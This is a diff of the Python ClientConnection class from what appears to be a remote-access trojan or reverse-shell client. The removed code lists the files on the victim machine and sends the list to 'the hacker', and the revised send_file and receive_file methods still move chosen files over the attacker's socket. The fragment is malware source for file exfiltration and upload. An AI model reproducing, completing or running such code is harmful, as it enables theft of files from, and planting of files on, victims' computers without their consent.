@@ -53,14 +53,9 @@ class ClientConnection:
         self.data_in_bytes = bytes(data, "utf-8")
         self.socket.send(self.data_in_bytes)
 
-    def receive_file(self):
-        tmp = tempfile.gettempdir()
-        file_name = self.receive_data()
+    def receive_file(self, filename):
 
-        path_dir, actual_file_name = os.path.split(file_name)
-
-        temp_path = os.path.join(tmp, actual_file_name)
-        with open(temp_path, "wb") as file:
+        with open(filename, "wb") as file:
             while True:
                 chunk = self.socket.recv(CHUNK_SIZE)
 
@@ -84,21 +79,7 @@ class ClientConnection:
 
         self.socket.sendall(chunk_bytes)
 
-    def send_file(self):
-        print("[+] Sending file")
-        # first find the list of files to be uploaded
-        files = glob.glob("*")
-        dict = {}
-        for index, file in enumerate(files):
-            dict[index] = file
-        dict_bytes = json.dumps(dict)
-
-        # send list of files to the hacker for him to select files
-        bytes_with_delimeter = dict_bytes + END_DELIMETER
-        self.socket.send(bytes_with_delimeter.encode())
-
-        # receive the file name to download
-        file2download = self.receive_data()
+    def send_file(self, file2download):
 
         print("[+] File/Folder selected : ", file2download)
 
